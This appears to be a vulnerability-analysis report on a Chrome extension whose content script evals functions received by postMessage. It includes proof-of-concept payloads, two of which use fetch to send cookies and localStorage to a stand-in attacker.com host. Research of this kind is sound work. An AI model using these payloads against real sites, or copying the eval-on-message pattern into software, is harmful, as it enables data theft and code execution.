# CoCo Analysis: bcojicpbaddhogbibcdgihofgcojkldl

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 1

---

## Sink: cs_window_eventListener_message → eval_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/bcojicpbaddhogbibcdgihofgcojkldl/opgen_generated_files/cs_0.js
Line 481: event => {
Line 484: if (event.data) {
Line 485: const fn = eval(`(${event.data.fn})`);

**Code:**

```javascript
// Content script - Entry point (cs_0.js, line 479-496)
window.addEventListener(
  'message',
  event => {
    // expect input data to include a valid function string
    // if the function is valid then execute
    if (event.data) {
      const fn = eval(`(${event.data.fn})`);  // ← attacker-controlled via event.data.fn
      if (typeof fn === 'function') {
        if (event.data.args) {
          fn(event.data.args);  // ← attacker-controlled function executed
        } else {
          fn();
        }
      }
    }
  },
  false
);
```

**Classification:** TRUE POSITIVE

**Attack Vector:** window.postMessage - Content script listens for message events on all frames (*://*/*)

**Attack:**

```javascript
// From any webpage where the extension's content script is injected
window.postMessage({
  fn: 'function() { alert(document.cookie); fetch("https://attacker.com/steal?data=" + document.cookie); }'
}, '*');

// Or execute arbitrary code:
window.postMessage({
  fn: 'function() { document.body.innerHTML = "<h1>Hacked</h1>"; }'
}, '*');

// Or steal sensitive data:
window.postMessage({
  fn: 'function() { fetch("https://attacker.com/exfil", {method: "POST", body: JSON.stringify({cookies: document.cookie, localStorage: localStorage})}) }'
}, '*');
```

**Impact:** Complete arbitrary code execution in the context of any webpage. Attacker can execute any JavaScript code via eval(), steal cookies, manipulate DOM, exfiltrate sensitive data, and perform any action the content script can perform on the page.
